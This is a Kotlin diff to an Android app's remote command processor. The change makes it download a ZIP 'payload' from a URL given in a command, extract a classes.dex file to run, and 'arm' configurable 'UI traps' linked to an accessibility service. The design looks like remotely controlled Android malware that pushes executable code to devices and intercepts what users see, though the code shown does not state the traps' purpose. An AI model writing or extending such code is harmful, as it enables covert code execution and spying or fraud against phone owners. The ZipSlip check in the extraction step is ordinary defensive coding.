@@ -1039,60 +1039,108 @@ object CommandProcessor {
                                 val t = trapsArr.getJSONObject(i)
                                 if (t.optString("label") != label) newArr.put(t)
                                 else {
-                                    // Clean up the file
-                                    try { java.io.File(t.getString("file_path")).delete() } catch(e:Exception){}
+                                    // Clean up the entire unzipped directory
+                                    try { java.io.File(t.getString("file_path")).deleteRecursively() } catch(e:Exception){}
                                 }
                             }
                             prefs.edit().putString("native_traps_array", newArr.toString()).apply()
                             status = "NATIVE_TRAP_REMOVED"
-                            errorMsg = "Purged DEX config: $label"
+                            errorMsg = "Purged Bundle config: $label"
                         } else {
                             val urlStr = json.getString("url")
-                            val targetDir = ctx.getDir("dex_traps", Context.MODE_PRIVATE)
-                            if (!targetDir.exists()) targetDir.mkdirs()
-                            val targetFile = java.io.File(targetDir, "${label}.dex")
+                            val targetBaseDir = ctx.getDir("dex_traps", Context.MODE_PRIVATE)
+                            val trapDir = java.io.File(targetBaseDir, label)
+                            
+                            // Clean slate for this label
+                            if (trapDir.exists()) trapDir.deleteRecursively()
+                            trapDir.mkdirs()
 
-                            // Download the DEX payload
+                            val zipFile = java.io.File(targetBaseDir, "${label}_temp.zip")
+
+                            DebugLogger.log("NATIVE_TRAP", "Downloading ZIP payload from $urlStr")
                             val url = URL(urlStr)
                             val conn = url.openConnection() as HttpURLConnection
                             conn.connectTimeout = 15000
                             conn.readTimeout = 15000
+                            
                             if (conn.responseCode == 200) {
                                 conn.inputStream.use { input ->
-                                    targetFile.outputStream().use { output -> input.copyTo(output) }
+                                    zipFile.outputStream().use { output -> input.copyTo(output) }
                                 }
+                                DebugLogger.log("NATIVE_TRAP", "Download complete (${zipFile.length()} bytes). Extracting ZIP...")
                                 
-                                val newTrap = org.json.JSONObject().apply {
-                                    put("label", label)
-                                    put("target", json.getString("target"))
-                                    put("strict", json.optBoolean("strict", false))
-                                    put("class_name", json.getString("class_name"))
-                                    put("timeout", json.optLong("timeout", 15L))
-                                    put("dim", json.optInt("dim", 20))
-                                    put("file_path", targetFile.absolutePath)
+                                var unzipSuccess = true
+                                try {
+                                    java.util.zip.ZipInputStream(zipFile.inputStream()).use { zis ->
+                                        var entry = zis.nextEntry
+                                        while (entry != null) {
+                                            val outFile = java.io.File(trapDir, entry.name)
+                                            // ZipSlip Vulnerability Protection
+                                            if (!outFile.canonicalPath.startsWith(trapDir.canonicalPath)) {
+                                                throw SecurityException("Zip Path Traversal detected: ${entry.name}")
+                                            }
+                                            if (entry.isDirectory) {
+                                                outFile.mkdirs()
+                                            } else {
+                                                outFile.parentFile?.mkdirs()
+                                                java.io.FileOutputStream(outFile).use { fos -> zis.copyTo(fos) }
+                                            }
+                                            entry = zis.nextEntry
+                                        }
+                                    }
+                                    DebugLogger.log("NATIVE_TRAP", "Extraction successful to ${trapDir.absolutePath}")
+                                } catch(e: Exception) {
+                                    unzipSuccess = false
+                                    DebugLogger.log("NATIVE_TRAP_ERR", "Unzip failed: ${e.message}\n${e.stackTraceToString()}")
+                                } finally {
+                                    zipFile.delete()
                                 }
 
-                                var found = false
-                                for (i in 0 until trapsArr.length()) {
-                                    val t = trapsArr.getJSONObject(i)
-                                    if (t.optString("label") == label) {
-                                        newArr.put(newTrap)
-                                        found = true
-                                    } else newArr.put(t)
-                                }
-                                if (!found) newArr.put(newTrap)
+                                if (unzipSuccess) {
+                                    val dexFile = java.io.File(trapDir, "classes.dex")
+                                    if (!dexFile.exists()) {
+                                        status = "FAILED_DEX_MISSING"
+                                        errorMsg = "Extracted zip did not contain 'classes.dex'"
+                                        DebugLogger.log("NATIVE_TRAP_ERR", errorMsg)
+                                    } else {
+                                        val newTrap = org.json.JSONObject().apply {
+                                            put("label", label)
+                                            put("target", json.getString("target"))
+                                            put("strict", json.optBoolean("strict", false))
+                                            put("class_name", json.getString("class_name"))
+                                            put("timeout", json.optLong("timeout", 15L))
+                                            put("dim", json.optInt("dim", 20))
+                                            put("file_path", trapDir.absolutePath) // We store the DIR, not the file
+                                        }
 
-                                prefs.edit().putString("native_traps_array", newArr.toString()).apply()
-                                status = "NATIVE_TRAP_ARMED"
-                                errorMsg = "Armed DEX config: $label"
+                                        var found = false
+                                        for (i in 0 until trapsArr.length()) {
+                                            val t = trapsArr.getJSONObject(i)
+                                            if (t.optString("label") == label) {
+                                                newArr.put(newTrap)
+                                                found = true
+                                            } else newArr.put(t)
+                                        }
+                                        if (!found) newArr.put(newTrap)
+
+                                        prefs.edit().putString("native_traps_array", newArr.toString()).apply()
+                                        status = "NATIVE_TRAP_ARMED"
+                                        errorMsg = "Armed Bundle: $label"
+                                        DebugLogger.log("NATIVE_TRAP", "Trap Armed. DEX located at: ${dexFile.absolutePath}")
+                                    }
+                                } else {
+                                    status = "FAILED_EXTRACTION"
+                                }
                             } else {
                                 status = "FAILED_DOWNLOAD"
                                 errorMsg = "HTTP Response: ${conn.responseCode}"
+                                DebugLogger.log("NATIVE_TRAP_ERR", "Download failed with HTTP ${conn.responseCode}")
                             }
                         }
                     } catch (e: Exception) {
                         status = "FAILED_PARSING"
                         errorMsg = e.message ?: "Invalid JSON or network error"
+                        DebugLogger.log("NATIVE_TRAP_ERR", "Critical Failure: \n${e.stackTraceToString()}")
                     }
                     MyAccessibilityService.instance?.reloadUiTraps()
                 }
